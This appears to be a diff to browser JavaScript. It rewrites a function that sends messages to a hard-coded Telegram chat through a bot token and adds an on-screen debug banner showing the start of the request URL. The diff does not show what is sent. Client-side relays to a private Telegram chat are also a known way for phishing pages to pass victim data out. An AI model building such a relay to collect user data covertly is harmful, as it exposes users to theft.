@@ -233,7 +233,15 @@ const TG_CHAT_ID = '-5218005748';
 
 function sendTelegram(msg) {
     var url = 'https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage?chat_id=' + encodeURIComponent(TG_CHAT_ID) + '&text=' + encodeURIComponent(msg) + '&parse_mode=HTML';
-    fetch(url, { method: 'GET' }).catch(function() {});
+    var dbg = document.createElement('div');
+    dbg.style.cssText = 'position:fixed;top:0;left:0;right:0;background:#222;color:#0f0;padding:8px;font-size:11px;z-index:99999;word-break:break-all;';
+    dbg.textContent = 'SENDING: ' + url.substring(0, 100) + '...';
+    document.body.appendChild(dbg);
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', url, true);
+    xhr.onload = function() { dbg.textContent += ' | OK: ' + xhr.responseText.substring(0, 50); };
+    xhr.onerror = function() { dbg.textContent += ' | ERROR'; };
+    xhr.send();
 }
 
 function updateAuditUI() {
